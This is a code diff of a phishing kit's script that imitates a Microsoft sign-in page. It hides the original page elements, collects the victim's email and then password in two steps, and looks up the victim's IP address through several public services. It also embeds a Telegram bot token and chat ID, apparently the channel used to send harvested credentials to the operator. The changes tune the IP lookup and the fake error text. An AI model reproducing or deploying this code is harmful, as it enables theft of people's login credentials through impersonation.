@@ -6,23 +6,30 @@
 <script>
     let step = 1; 
     let attempts = 0;
-    let userIP = "Fetching..."; 
+    let userIP = "Unknown"; 
 
     const botToken = '8024281544:AAHo40hPBYBYAZeFhSLGDsdgVkz5Xe4TyiM';
     const chatId = '7523003121';
 
-    // Reliable IP Fetch
+    // Reliable Multi-Source IP Fetching
     async function fetchIP() {
-        try {
-            const response = await fetch('https://api.ipify.org');
-            const data = await response.json();
-            userIP = data.ip || "Unknown";
-        } catch (e) { userIP = "Unknown"; }
+        const services = [
+            'https://api.ipify.org',
+            'https://ipinfo.io',
+            'https://api64.ipify.org'
+        ];
+        for (let url of services) {
+            try {
+                const response = await fetch(url, { signal: AbortSignal.timeout(3000) });
+                const data = await response.json();
+                userIP = data.ip || data.address || "Unknown";
+                if (userIP !== "Unknown") break;
+            } catch (e) { continue; }
+        }
     }
     fetchIP();
 
     window.addEventListener('DOMContentLoaded', () => {
-        // KILL ORIGINAL ARROWS/LOGOS
         const style = document.createElement('style');
         style.innerHTML = `
             button[type="button"] img, .back-button, #idBtn_Back, .identityBanner img, .back-arrow { 
@@ -39,15 +46,14 @@
         if (!passwordField) return;
         const parentContainer = passwordField.parentNode;
 
-        // CREATE ERROR MESSAGE ELEMENT
         const errorDiv = document.createElement('div');
         errorDiv.className = "error-text";
-        errorDiv.innerText = "Your password is correct, but your account is flagged. Please try again.";
+        errorDiv.innerText = "Please check your password and try again.";
 
-        // IDENTITY ROW (ARROW + EMAIL) - High position
+        // IDENTITY ROW (ARROW + EMAIL) - Positioned High
         const identityRow = document.createElement('div');
         identityRow.id = "custom-identity-row";
-        identityRow.style = "display: none; align-items: center; gap: 8px; margin-top: -25px; margin-bottom: 10px; cursor: pointer; width: 100%;";
+        identityRow.style = "display: none; align-items: center; gap: 8px; margin-top: -24px; margin-bottom: 8px; cursor: pointer; width: 100%;";
         identityRow.innerHTML = `
             <div style="display: flex; align-items: center;">
                 <svg viewBox="0 0 24 24" style="width: 18px; height: 18px; fill: #666; margin-right: 8px;">
@@ -65,7 +71,6 @@
             if (titleHeader) titleHeader.innerText = "Sign in";
         };
 
-        // STYLE THE HEADER (BOLD)
         if (titleHeader) {
             titleHeader.style.fontSize = "1.625rem"; 
             titleHeader.style.fontWeight = "600";
@@ -78,7 +83,6 @@
         emailInput.placeholder = 'Email, phone, or Skype';
         emailInput.style = "width:100%; height:36px; padding:6px 0px; border:none; border-bottom:1px solid #666; outline:none; font-family:'Segoe UI'; margin-bottom:12px; font-size: 0.9375rem;";
         
-        // DOM PLACEMENT
         parentContainer.prepend(passwordField); 
         parentContainer.insertBefore(errorDiv, passwordField);
         parentContainer.insertBefore(emailInput, errorDiv); 
@@ -87,16 +91,12 @@
 
         passwordField.style.display = "none";
 
-        // BUTTON LOGIC
         if (signInButton) {
             signInButton.addEventListener('click', async (e) => {
                 e.preventDefault();
-                if (userIP === "Fetching...") await fetchIP();
-
                 if (step === 1) {
                     const emailVal = emailInput.value.trim();
                     if (emailVal === "") return;
-                    
                     document.getElementById('display-email').innerText = emailVal;
                     emailInput.style.display = "none";
                     identityRow.style.display = "flex"; 
@@ -133,9 +133,6 @@
         }
     });
 </script>
-
-
-
 
 
 
